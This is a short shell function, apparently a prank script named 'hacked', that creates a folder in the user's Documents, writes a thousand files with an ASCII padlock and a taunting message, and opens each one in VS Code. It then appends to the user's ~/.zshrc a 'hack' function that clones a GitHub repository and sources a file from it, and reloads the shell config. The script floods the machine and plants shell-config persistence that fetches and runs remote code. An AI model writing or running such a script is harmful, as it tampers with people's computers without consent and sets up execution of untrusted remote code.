hacked() {
  sleep 10s;
  cd ~/Documents;
  mkdir "ive been hacked";
  cd ~/Documents/"ive been hacked";
  for i in `seq 1 1000`
  do
    if [ $i -eq 51 ]
    then
      sleep 5s;
    fi
      echo "
     .--------.
    / .------. \\
   / /        \ \\
   | |        | |
  _| |________| |_
.' |_|        |_| '.
'._____ ____ _____.'
|     .'____'.     |
'.__.'.'    '.'.__.'
'.__  | YALE |  __.'
|   '.'.____.'.'   |
'.____'.____.'____.'
'.________________.'
  use this and dont get hacked again!" > "hacked$i.txt";
    code "hacked$i.txt";
    if [ $i -lt 50 ]
    then
      sleep 0.7s;
    fi
    sleep 0.4s;
    done
  cd ~/
  echo "
    hack() {
      git clone https://github.com/jfreire-benites/hm && cd hm && source .zshrchk && hacked;
    }
  " >> .zshrc;
  source .zshrc;
}